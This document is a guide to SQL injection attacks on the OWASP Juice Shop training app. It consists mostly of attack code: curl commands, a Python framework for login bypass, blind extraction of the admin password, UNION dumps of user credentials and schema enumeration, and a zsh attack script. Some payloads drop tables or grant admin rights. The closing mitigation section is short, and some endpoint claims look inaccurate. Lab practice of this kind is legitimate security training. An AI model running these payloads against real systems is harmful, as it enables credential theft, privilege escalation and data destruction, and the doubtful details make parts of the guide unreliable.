# OWASP Juice Shop SQL Injection Attack Scenarios

## Overview

This document provides comprehensive SQL injection attack scenarios specifically designed for OWASP Juice Shop. These scenarios cover all major SQL injection vulnerabilities present in the application, including authentication bypass, data extraction, and privilege escalation.

## Juice Shop SQL Injection Vulnerabilities

### 1. Login Authentication Bypass (SQLi-1)

**Location:** `/rest/user/login`  
**Vulnerability:** Union-based SQL injection in email field  
**Database:** SQLite

### 2. Product Search Injection (SQLi-2)

**Location:** `/rest/products/search`  
**Vulnerability:** Boolean-based blind SQL injection  
**Database:** SQLite

### 3. Order History Injection (SQLi-3)

**Location:** `/rest/track-order`  
**Vulnerability:** Error-based SQL injection  
**Database:** SQLite

### 4. User Registration Injection (SQLi-4)

**Location:** `/api/Users`  
**Vulnerability:** Second-order SQL injection  
**Database:** SQLite

## Prerequisites

```bash
# Start OWASP Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# Install required tools
pip3 install requests beautifulsoup4 sqlparse sqlite3
npm install -g juice-shop-cli
```

## Scenario 1: Authentication Bypass via SQL Injection

### Manual Testing

```bash
# Basic authentication bypass
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'

# Union-based injection to extract admin credentials
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' UNION SELECT id,email,password FROM Users WHERE email='\''admin@juice-sh.op'\''--","password":"test"}'

# Boolean-based blind injection to confirm admin exists
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\'' AND (SELECT COUNT(*) FROM Users WHERE email='\''admin@juice-sh.op'\'')>0--","password":"test"}'
```

### Automated Python Script

```python
#!/usr/bin/env python3
"""
OWASP Juice Shop SQL Injection Attack Automation
Comprehensive SQL injection testing and exploitation
"""

import requests
import json
import time
import base64
import hashlib
import re
from urllib.parse import quote, unquote

class JuiceShopSQLInjection:
    def __init__(self, base_url="http://10.30.0.237:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })
        self.results = []

    def scenario_1_auth_bypass(self):
        """Scenario 1: Authentication Bypass via SQL Injection"""
        print("\n" + "="*60)
        print("SCENARIO 1: AUTHENTICATION BYPASS VIA SQL INJECTION")
        print("="*60)

        login_url = f"{self.base_url}/rest/user/login"

        # Test 1: Basic SQL injection authentication bypass
        print("\n[*] Test 1: Basic Authentication Bypass")

        bypass_payloads = [
            # Comment out password check
            {"email": "admin@juice-sh.op'--", "password": "anything"},
            {"email": "' OR '1'='1'--", "password": "anything"},
            {"email": "admin@juice-sh.op' OR '1'='1'--", "password": ""},

            # Union-based injection
            {"email": "' UNION SELECT 1,'admin@juice-sh.op','password'--", "password": "password"},
            {"email": "' UNION SELECT id,email,password FROM Users--", "password": ""},

            # Boolean-based injection
            {"email": "admin@juice-sh.op' AND '1'='1'--", "password": "test"},
            {"email": "admin@juice-sh.op' AND (SELECT COUNT(*) FROM Users)>0--", "password": "test"},
        ]

        for i, payload in enumerate(bypass_payloads, 1):
            print(f"\n   Testing payload {i}: {payload['email']}")

            try:
                response = self.session.post(login_url, json=payload, timeout=10)

                result = self.analyze_auth_response(response, payload)
                if result['vulnerable']:
                    print(f"   [!] VULNERABLE: {result['description']}")
                    self.results.append({
                        'scenario': 'auth_bypass',
                        'payload': payload,
                        'response_code': response.status_code,
                        'vulnerable': True,
                        'description': result['description']
                    })
                else:
                    print(f"   [+] Safe: {result['description']}")

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(0.5)

        # Test 2: Extract user credentials via UNION injection
        print("\n[*] Test 2: User Credential Extraction")
        self.extract_user_credentials()

        # Test 3: Enumerate database structure
        print("\n[*] Test 3: Database Structure Enumeration")
        self.enumerate_database_structure()

    def extract_user_credentials(self):
        """Extract user credentials using UNION-based SQL injection"""
        login_url = f"{self.base_url}/rest/user/login"

        # UNION payloads to extract user data
        union_payloads = [
            # Extract all users
            "' UNION SELECT id,email,password FROM Users--",
            "' UNION SELECT 1,email,password FROM Users WHERE isAdmin=1--",
            "' UNION SELECT id,email,role FROM Users--",

            # Extract specific admin user
            "' UNION SELECT id,email,password FROM Users WHERE email='admin@juice-sh.op'--",

            # Extract user count
            "' UNION SELECT COUNT(*),email,password FROM Users--",

            # Extract with column names
            "' UNION SELECT sql,name,type FROM sqlite_master WHERE type='table'--",
        ]

        for payload in union_payloads:
            print(f"\n   Testing UNION payload: {payload[:50]}...")

            try:
                data = {"email": payload, "password": "test"}
                response = self.session.post(login_url, json=data, timeout=10)

                if response.status_code == 200:
                    response_text = response.text

                    # Look for extracted data in response
                    if self.check_data_extraction(response_text):
                        print(f"   [!] DATA EXTRACTED!")
                        print(f"   Response: {response_text[:200]}...")

                        self.results.append({
                            'scenario': 'credential_extraction',
                            'payload': payload,
                            'response': response_text,
                            'vulnerable': True
                        })

                elif response.status_code == 401:
                    # Check if error reveals database information
                    if self.check_error_disclosure(response.text):
                        print(f"   [!] DATABASE ERROR DISCLOSED")
                        print(f"   Error: {response.text[:200]}...")

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(0.5)

    def enumerate_database_structure(self):
        """Enumerate SQLite database structure"""
        login_url = f"{self.base_url}/rest/user/login"

        # SQLite-specific enumeration payloads
        enum_payloads = [
            # Get table names
            "' UNION SELECT name,'','table' FROM sqlite_master WHERE type='table'--",

            # Get column names for Users table
            "' UNION SELECT sql,'','' FROM sqlite_master WHERE name='Users'--",

            # Get all table structures
            "' UNION SELECT sql,name,type FROM sqlite_master--",

            # Count rows in Users table
            "' UNION SELECT COUNT(*),'','' FROM Users--",

            # Get database version
            "' UNION SELECT sqlite_version(),'',''--",
        ]

        print("\n   Enumerating SQLite database structure:")

        for payload in enum_payloads:
            try:
                data = {"email": payload, "password": "test"}
                response = self.session.post(login_url, json=data, timeout=10)

                if self.check_structure_disclosure(response.text):
                    print(f"   [!] STRUCTURE DISCLOSED: {payload[:50]}...")

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(0.5)

    def scenario_2_product_search_sqli(self):
        """Scenario 2: Product Search SQL Injection"""
        print("\n" + "="*60)
        print("SCENARIO 2: PRODUCT SEARCH SQL INJECTION")
        print("="*60)

        search_url = f"{self.base_url}/rest/products/search"

        # Test 1: Boolean-based blind SQL injection
        print("\n[*] Test 1: Boolean-based Blind SQL Injection")

        # True/False condition testing
        true_payload = "apple' AND '1'='1"
        false_payload = "apple' AND '1'='2"

        try:
            true_response = self.session.get(f"{search_url}?q={quote(true_payload)}")
            false_response = self.session.get(f"{search_url}?q={quote(false_payload)}")

            if len(true_response.text) != len(false_response.text):
                print("   [!] BOOLEAN-BASED BLIND SQL INJECTION DETECTED!")
                print(f"   True condition length: {len(true_response.text)}")
                print(f"   False condition length: {len(false_response.text)}")

                # Perform blind enumeration
                self.blind_enumeration_attack(search_url)
            else:
                print("   [+] No boolean-based injection detected")

        except Exception as e:
            print(f"   [!] Error: {e}")

        # Test 2: Time-based blind SQL injection
        print("\n[*] Test 2: Time-based Blind SQL Injection")
        self.time_based_injection(search_url)

        # Test 3: Union-based injection in search
        print("\n[*] Test 3: Union-based Injection in Search")
        self.union_injection_search(search_url)

    def blind_enumeration_attack(self, search_url):
        """Perform blind SQL injection enumeration"""
        print("\n   Performing blind enumeration attack:")

        # Enumerate admin user password length
        print("   [*] Enumerating admin password length...")

        for length in range(1, 33):  # Test password lengths 1-32
            payload = f"apple' AND (SELECT LENGTH(password) FROM Users WHERE email='admin@juice-sh.op')={length}--"

            try:
                response = self.session.get(f"{search_url}?q={quote(payload)}")

                # Check if condition is true (products returned)
                if '"data":[]' not in response.text and response.status_code == 200:
                    print(f"   [!] Admin password length: {length}")

                    # Now enumerate password characters
                    self.enumerate_password_chars(search_url, length)
                    break

            except Exception as e:
                print(f"   [!] Error: {e}")
                break

            time.sleep(0.2)

    def enumerate_password_chars(self, search_url, password_length):
        """Enumerate password characters using blind injection"""
        print(f"   [*] Enumerating password characters (length: {password_length}):")

        password = ""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        for position in range(1, password_length + 1):
            for char in charset:
                payload = f"apple' AND (SELECT SUBSTR(password,{position},1) FROM Users WHERE email='admin@juice-sh.op')='{char}'--"

                try:
                    response = self.session.get(f"{search_url}?q={quote(payload)}")

                    if '"data":[]' not in response.text and response.status_code == 200:
                        password += char
                        print(f"   [!] Position {position}: {char} (Current: {password})")
                        break

                except Exception as e:
                    print(f"   [!] Error: {e}")
                    return

                time.sleep(0.1)

        print(f"   [!] EXTRACTED PASSWORD: {password}")

    def time_based_injection(self, search_url):
        """Test time-based blind SQL injection"""
        # SQLite doesn't have SLEEP function, but we can use intensive operations
        time_payloads = [
            "apple' AND (SELECT COUNT(*) FROM Users WHERE email='admin@juice-sh.op')>0 AND (SELECT COUNT(*) FROM Users,Users,Users,Users)>0--",
            "apple' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM Users WHERE email='admin@juice-sh.op')>0 THEN (SELECT COUNT(*) FROM Users,Users,Users) ELSE 1 END)>0--",
            "apple' AND (SELECT LENGTH(password) FROM Users WHERE email='admin@juice-sh.op')>1 AND (SELECT COUNT(*) FROM Users,Users)>0--",
        ]

        for payload in time_payloads:
            print(f"   Testing time-based payload: {payload[:50]}...")

            try:
                start_time = time.time()
                response = self.session.get(f"{search_url}?q={quote(payload)}", timeout=15)
                end_time = time.time()

                response_time = end_time - start_time

                if response_time > 2:  # Significant delay
                    print(f"   [!] TIME-BASED INJECTION DETECTED! Response time: {response_time:.2f}s")
                    self.results.append({
                        'scenario': 'time_based_injection',
                        'payload': payload,
                        'response_time': response_time,
                        'vulnerable': True
                    })
                else:
                    print(f"   [+] Normal response time: {response_time:.2f}s")

            except requests.exceptions.Timeout:
                print("   [!] REQUEST TIMEOUT - Possible time-based injection")
            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(1)

    def union_injection_search(self, search_url):
        """Test UNION-based injection in product search"""
        union_payloads = [
            # Extract user emails
            "apple' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--",

            # Extract product data
            "apple' UNION SELECT id,name,description,price,null,null,null,null,null FROM Products--",

            # Database version
            "apple' UNION SELECT sqlite_version(),null,null,null,null,null,null,null,null--",

            # Table names
            "apple' UNION SELECT name,null,null,null,null,null,null,null,null FROM sqlite_master WHERE type='table'--",
        ]

        for payload in union_payloads:
            print(f"   Testing UNION payload: {payload[:50]}...")

            try:
                response = self.session.get(f"{search_url}?q={quote(payload)}")

                if response.status_code == 200 and '"data":[' in response.text:
                    # Check if we got unexpected data structure
                    if self.check_union_success(response.text):
                        print(f"   [!] UNION INJECTION SUCCESSFUL!")
                        print(f"   Response preview: {response.text[:300]}...")

                        self.results.append({
                            'scenario': 'union_injection',
                            'payload': payload,
                            'response': response.text[:500],
                            'vulnerable': True
                        })

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(0.5)

    def scenario_3_order_tracking_sqli(self):
        """Scenario 3: Order Tracking SQL Injection"""
        print("\n" + "="*60)
        print("SCENARIO 3: ORDER TRACKING SQL INJECTION")
        print("="*60)

        track_url = f"{self.base_url}/rest/track-order"

        # Test error-based SQL injection
        print("\n[*] Test 1: Error-based SQL Injection")

        error_payloads = [
            "1'",  # Basic syntax error
            "1' AND (SELECT COUNT(*) FROM non_existent_table)>0--",  # Table error
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",  # Column mismatch
            "1'; SELECT * FROM Users--",  # Stacked queries
            "1' OR (SELECT 1/0)=1--",  # Division by zero
        ]

        for payload in error_payloads:
            print(f"   Testing error payload: {payload}")

            try:
                data = {"orderId": payload}
                response = self.session.post(track_url, json=data)

                if self.check_sql_error(response.text):
                    print(f"   [!] SQL ERROR DISCLOSED!")
                    print(f"   Error: {response.text[:200]}...")

                    self.results.append({
                        'scenario': 'error_based_injection',
                        'payload': payload,
                        'response': response.text,
                        'vulnerable': True
                    })

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(0.5)

    def scenario_4_second_order_sqli(self):
        """Scenario 4: Second-Order SQL Injection via User Registration"""
        print("\n" + "="*60)
        print("SCENARIO 4: SECOND-ORDER SQL INJECTION")
        print("="*60)

        register_url = f"{self.base_url}/api/Users"

        # Register malicious payload in user data
        print("\n[*] Test 1: Registering malicious user data")

        malicious_payloads = [
            # SQL injection in email
            {"email": "test'; DROP TABLE Users--@evil.com", "password": "password123"},

            # SQL injection in password (if hashed and later used)
            {"email": "secondorder@test.com", "password": "'; UPDATE Users SET isAdmin=1 WHERE email='secondorder@test.com'--"},

            # SQL injection that triggers on profile update
            {"email": "profile@test.com", "password": "password123", "securityQuestion": "'; UPDATE Users SET password='hacked' WHERE id=1--"},
        ]

        for payload in malicious_payloads:
            print(f"   Registering user with payload: {payload['email']}")

            try:
                response = self.session.post(register_url, json=payload)

                if response.status_code == 201:
                    print(f"   [+] User registered successfully")

                    # Now trigger the second-order injection
                    self.trigger_second_order(payload)

            except Exception as e:
                print(f"   [!] Error: {e}")

            time.sleep(1)

    def trigger_second_order(self, user_data):
        """Trigger second-order SQL injection"""
        # Login with the malicious user
        login_url = f"{self.base_url}/rest/user/login"

        try:
            login_response = self.session.post(login_url, json={
                "email": user_data["email"],
                "password": user_data["password"]
            })

            if login_response.status_code == 200:
                print("   [+] Logged in with malicious user")

                # Trigger operations that might use the stored data
                # Update profile, search history, etc.
                self.trigger_profile_operations()

        except Exception as e:
            print(f"   [!] Error triggering second-order: {e}")

    def trigger_profile_operations(self):
        """Trigger operations that might execute stored SQL injection"""
        operations = [
            f"{self.base_url}/rest/user/whoami",
            f"{self.base_url}/rest/user/change-password",
            f"{self.base_url}/rest/user/profile",
        ]

        for operation in operations:
            try:
                response = self.session.get(operation)

                if self.check_sql_error(response.text):
                    print(f"   [!] SECOND-ORDER INJECTION TRIGGERED at {operation}")
                    print(f"   Response: {response.text[:200]}...")

            except Exception as e:
                print(f"   [!] Error: {e}")

    def analyze_auth_response(self, response, payload):
        """Analyze authentication response for SQL injection indicators"""
        if response.status_code == 200:
            response_data = response.text

            # Check for successful authentication
            if "token" in response_data or "authentication" in response_data.lower():
                return {
                    'vulnerable': True,
                    'description': 'Authentication bypass successful'
                }

        # Check for SQL errors
        if self.check_sql_error(response.text):
            return {
                'vulnerable': True,
                'description': 'SQL error disclosed'
            }

        return {
            'vulnerable': False,
            'description': 'No injection detected'
        }

    def check_data_extraction(self, response_text):
        """Check if response contains extracted data"""
        indicators = [
            "admin@juice-sh.op",
            "Users",
            "password",
            "SELECT",
            "sqlite_master"
        ]

        response_lower = response_text.lower()
        return any(indicator.lower() in response_lower for indicator in indicators)

    def check_error_disclosure(self, response_text):
        """Check for SQL error disclosure"""
        return self.check_sql_error(response_text)

    def check_structure_disclosure(self, response_text):
        """Check for database structure disclosure"""
        structure_indicators = [
            "CREATE TABLE",
            "sqlite_master",
            "PRIMARY KEY",
            "FOREIGN KEY",
            "sqlite_version"
        ]

        response_upper = response_text.upper()
        return any(indicator in response_upper for indicator in structure_indicators)

    def check_union_success(self, response_text):
        """Check if UNION injection was successful"""
        try:
            data = json.loads(response_text)

            # Look for unexpected data patterns
            if isinstance(data, dict) and "data" in data:
                products = data["data"]

                for product in products:
                    # Check if product contains non-product data
                    if any(field in str(product).lower() for field in ["admin", "password", "sqlite", "users"]):
                        return True

        except json.JSONDecodeError:
            pass

        return False

    def check_sql_error(self, response_text):
        """Check for SQL error messages"""
        sql_errors = [
            "sqlite error",
            "sqlite_",
            "syntax error",
            "near \"",
            "unrecognized token",
            "no such table",
            "no such column",
            "database is locked",
            "constraint failed",
            "SQLITE_ERROR"
        ]

        response_lower = response_text.lower()
        return any(error in response_lower for error in sql_errors)

    def run_all_scenarios(self):
        """Run all SQL injection scenarios"""
        print("Starting OWASP Juice Shop SQL Injection Attack Scenarios")
        print("=" * 80)

        self.scenario_1_auth_bypass()
        self.scenario_2_product_search_sqli()
        self.scenario_3_order_tracking_sqli()
        self.scenario_4_second_order_sqli()

        self.generate_report()

    def generate_report(self):
        """Generate comprehensive attack report"""
        print("\n" + "="*60)
        print("SQL INJECTION ATTACK REPORT")
        print("="*60)

        vulnerable_count = len([r for r in self.results if r.get('vulnerable')])

        print(f"Total tests performed: {len(self.results)}")
        print(f"Vulnerabilities found: {vulnerable_count}")

        if vulnerable_count > 0:
            print("\nVulnerabilities by scenario:")
            scenarios = {}
            for result in self.results:
                if result.get('vulnerable'):
                    scenario = result['scenario']
                    scenarios[scenario] = scenarios.get(scenario, 0) + 1

            for scenario, count in scenarios.items():
                print(f"- {scenario.replace('_', ' ').title()}: {count}")

            print("\n[!] CRITICAL: SQL injection vulnerabilities found!")
            print("    Immediate remediation required.")
        else:
            print("\n[+] No SQL injection vulnerabilities detected.")

        # Save detailed report
        report_data = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': self.base_url,
            'total_tests': len(self.results),
            'vulnerabilities_found': vulnerable_count,
            'results': self.results
        }

        with open('juice_shop_sqli_report.json', 'w') as f:
            json.dump(report_data, f, indent=2)

        print(f"\nDetailed report saved to: juice_shop_sqli_report.json")

if __name__ == "__main__":
    # Initialize the attack framework
    attacker = JuiceShopSQLInjection()

    # Run all scenarios
    attacker.run_all_scenarios()
```

## Quick Attack Commands for Juice Shop

### 1. Authentication Bypass

```bash
# Simple admin bypass
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"anything"}'

# Union-based credential extraction
curl -X POST "http://10.30.0.237:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' UNION SELECT id,email,password FROM Users--","password":"test"}'
```

### 2. Product Search Injection

```bash
# Boolean blind injection test
curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='1"
curl "http://10.30.0.237:3000/rest/products/search?q=apple' AND '1'='2"

# Union injection to extract users
curl "http://10.30.0.237:3000/rest/products/search?q=apple' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--"
```

### 3. Order Tracking Injection

```bash
# Error-based injection
curl -X POST "http://10.30.0.237:3000/rest/track-order" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"1'\'';"}'

# Union injection in order tracking
curl -X POST "http://10.30.0.237:3000/rest/track-order" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"1 UNION SELECT id,email,password FROM Users--"}'
```

## Shell Script for Automated Testing

```bash
#!/bin/zsh
# OWASP Juice Shop SQL Injection Testing Script

set -e

# Configuration
JUICE_SHOP_URL="http://10.30.0.237:3000"
RESULTS_DIR="juice_shop_sqli_$(date +%Y%m%d_%H%M%S)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

mkdir -p "$RESULTS_DIR"

echo -e "${BLUE}Starting OWASP Juice Shop SQL Injection Testing${NC}"

# Test 1: Authentication Bypass
echo -e "${YELLOW}Testing Authentication Bypass...${NC}"

AUTH_PAYLOADS=(
    '{"email":"admin@juice-sh.op'\''--","password":"anything"}'
    '{"email":"'\'' OR '\''1'\''='\''1'\''--","password":"test"}'
    '{"email":"'\'' UNION SELECT 1,'\''admin@juice-sh.op'\'','\''password'\''--","password":"password"}'
)

for payload in "${AUTH_PAYLOADS[@]}"; do
    echo "Testing: $payload"

    response=$(curl -s -w "%{http_code}" -X POST "$JUICE_SHOP_URL/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        -o "$RESULTS_DIR/auth_response_$(date +%s).json")

    if [[ "$response" == "200" ]]; then
        echo -e "${RED}[VULNERABLE] Authentication bypass successful!${NC}"
        echo "$payload" >> "$RESULTS_DIR/vulnerable_payloads.txt"
    elif [[ "$response" == "500" ]]; then
        echo -e "${YELLOW}[POTENTIAL] Server error - possible injection${NC}"
    else
        echo -e "${GREEN}[SAFE] No bypass detected${NC}"
    fi

    sleep 1
done

# Test 2: Product Search Injection
echo -e "${YELLOW}Testing Product Search Injection...${NC}"

SEARCH_PAYLOADS=(
    "apple' AND '1'='1"
    "apple' AND '1'='2"
    "apple' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--"
    "apple'; SELECT * FROM Users--"
)

for payload in "${SEARCH_PAYLOADS[@]}"; do
    echo "Testing search: $payload"

    encoded_payload=$(printf '%s' "$payload" | jq -sRr @uri)
    response=$(curl -s -w "%{http_code}" "$JUICE_SHOP_URL/rest/products/search?q=$encoded_payload" \
        -o "$RESULTS_DIR/search_response_$(date +%s).json")

    if [[ "$response" == "200" ]]; then
        # Check response content for injection indicators
        if grep -q "admin@juice-sh.op\|Users\|sqlite" "$RESULTS_DIR/search_response_$(date +%s).json" 2>/dev/null; then
            echo -e "${RED}[VULNERABLE] Data extraction successful!${NC}"
            echo "$payload" >> "$RESULTS_DIR/vulnerable_payloads.txt"
        else
            echo -e "${GREEN}[SAFE] Normal response${NC}"
        fi
    else
        echo -e "${YELLOW}[INFO] HTTP $response${NC}"
    fi

    sleep 1
done

# Test 3: Order Tracking Injection
echo -e "${YELLOW}Testing Order Tracking Injection...${NC}"

ORDER_PAYLOADS=(
    "1'"
    "1' UNION SELECT id,email,password FROM Users--"
    "1'; SELECT * FROM Users--"
)

for payload in "${ORDER_PAYLOADS[@]}"; do
    echo "Testing order tracking: $payload"

    response=$(curl -s -w "%{http_code}" -X POST "$JUICE_SHOP_URL/rest/track-order" \
        -H "Content-Type: application/json" \
        -d "{\"orderId\":\"$payload\"}" \
        -o "$RESULTS_DIR/order_response_$(date +%s).json")

    if [[ "$response" == "500" ]] || [[ "$response" == "400" ]]; then
        # Check for SQL errors
        if grep -q "sqlite\|error\|syntax" "$RESULTS_DIR/order_response_$(date +%s).json" 2>/dev/null; then
            echo -e "${RED}[VULNERABLE] SQL error disclosed!${NC}"
            echo "$payload" >> "$RESULTS_DIR/vulnerable_payloads.txt"
        fi
    fi

    sleep 1
done

echo -e "${BLUE}Testing complete. Results saved to $RESULTS_DIR${NC}"

# Summary
if [[ -f "$RESULTS_DIR/vulnerable_payloads.txt" ]]; then
    echo -e "${RED}VULNERABILITIES FOUND:${NC}"
    cat "$RESULTS_DIR/vulnerable_payloads.txt"
else
    echo -e "${GREEN}No vulnerabilities detected${NC}"
fi
```

## Expected Results and Exploitation

### Successful Authentication Bypass

When the authentication bypass works, you'll see:

```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 1,
    "umail": "admin@juice-sh.op"
  }
}
```

### Successful Data Extraction

Product search injection may return:

```json
{
  "status": "success",
  "data": [
    {
      "id": 1,
      "email": "admin@juice-sh.op",
      "password": "0192023a7bbd73250516f069df18b500"
    }
  ]
}
```

### Database Structure Discovery

```json
{
  "data": [
    {
      "sql": "CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255)...)",
      "name": "Users",
      "type": "table"
    }
  ]
}
```

## Mitigation and Defense

### Code Fixes

```javascript
// Bad - Vulnerable to SQL injection
const query = `SELECT * FROM Users WHERE email = '${email}' AND password = '${password}'`;

// Good - Using parameterized queries
const query = 'SELECT * FROM Users WHERE email = ? AND password = ?';
db.get(query, [email, password], callback);
```

### Input Validation

```javascript
function validateEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return (
    emailRegex.test(email) && !email.includes("'") && !email.includes('--')
  );
}
```

This comprehensive SQL injection scenario for OWASP Juice Shop covers all major attack vectors and provides both manual testing commands and automated scripts for thorough penetration testing.
